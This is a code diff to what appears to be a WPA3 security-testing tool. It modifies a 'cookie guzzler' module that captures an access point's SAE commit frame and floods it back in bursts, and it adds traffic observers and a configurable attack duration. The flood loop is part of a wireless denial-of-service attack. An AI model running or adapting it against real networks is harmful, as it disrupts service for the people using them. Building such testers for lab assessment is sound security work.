@@ -7,6 +7,10 @@
 #include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
 #include "config/RunStatus.h"
 #include "logger/log.h"
+#include "observer/mausezahn_wrapper.h"
+#include "observer/observers.h"
+#include "observer/tcpdump_wrapper.h"
+#include "observer/tshark_wrapper.h"
 #include "system/hw_capabilities.h"
 
 using namespace std;
@@ -65,14 +69,20 @@ namespace wpa3_tester::cookie_guzzler{
             //  burst of packet
             constexpr size_t BURST_SIZE = 128;
             for (size_t i = 0; i < BURST_SIZE; ++i) {sender.send(cg_frame);}
-            counter += 128;
+            counter += BURST_SIZE;
 
             if (counter >= next_log) {
                 log(LogLevel::DEBUG, "Packets sent: "+to_string(counter));
-                next_log += 2000;
+                next_log += 20000;
             }
         }
         log(LogLevel::INFO, "Done. Total packets sent: "+to_string(counter));
+    }
+
+    void speed_observation_start(RunStatus& rs){
+        observer::start_musezahn(rs, "mz_gen", "client", "access_point");
+        observer::start_tshark(rs, "client", "udp port 5201");
+        observer::start_tcpdump(rs, "access_point", "udp port 5201");
     }
 
     void run_attack(RunStatus &rs){
@@ -83,11 +93,22 @@ namespace wpa3_tester::cookie_guzzler{
 
         const SAEPair sae_params = get_commit_values(attacker["iface"], attacker["sniff_iface"], ssid, ap["mac"], 30);
         if (sae_params.success) {
+            speed_observation_start(rs);
             log(LogLevel::INFO, "SAE Commit captured");
             const HWAddress<6> ap_mac(ap["mac"]);
-            check_vuln(attacker["iface"], ap_mac, 600, sae_params);
+            const auto& att_cfg = rs.config.at("attack_config");
+            const int duration = att_cfg.at("attack_time_sec").get<int>();
+            check_vuln(attacker["iface"], ap_mac, duration, sae_params);
         } else {
             log(LogLevel::ERROR, "SAE Commit capture failed");
         }
     }
+
+    void stats_attack(const RunStatus &rs){
+        vector<observer::graph_lines> events;
+        const string STA_graph_path = observer::tshark_graph(rs, "client", events);
+        const string AP_graph_path =
+            observer::tshark_graph(rs, "access_point", events, observer::get_observer_folder(rs, "tcpdump"));
+    }
+
 }
